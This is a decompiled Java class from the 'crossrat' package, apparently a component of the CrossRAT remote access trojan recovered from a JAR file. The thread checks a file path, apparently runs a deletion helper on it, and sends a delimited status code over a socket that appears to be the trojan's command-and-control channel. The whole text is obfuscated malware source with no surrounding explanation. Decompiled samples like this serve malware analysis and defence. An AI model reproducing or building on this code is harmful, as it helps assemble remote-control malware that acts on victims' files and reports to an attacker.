package crossrat;

import java.io.DataOutputStream;
import java.io.File;
import java.net.Socket;

final class b
  extends Thread
{
  private String a;
  private boolean b;
  private String c;
  
  public b(String paramString1, String paramString2)
  {
    this.a = paramString1;
    this.c = paramString2;
  }
  
  public final void run()
  {
    Object localObject = new File(this.a);
    DataOutputStream localDataOutputStream = null;
    Exception localException1;
    try
    {
      localDataOutputStream = new DataOutputStream(k.k.getOutputStream());
    }
    catch (Exception localException2)
    {
      (localException1 = localException2).printStackTrace();
    }
    if (((File)localObject).exists())
    {
      this.b = org.a.a.a.b.a((File)localObject);
      if (this.b) {
        localObject = "1";
      } else {
        localObject = "0";
      }
    }
    else
    {
      localObject = "2";
    }
    try
    {
      localDataOutputStream.writeBytes(k.g + k.d + k.E + k.d + (String)localObject + k.d + this.c + k.d + "&&&");
      return;
    }
    catch (Exception localException3)
    {
      (localException1 = localException3).printStackTrace();
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */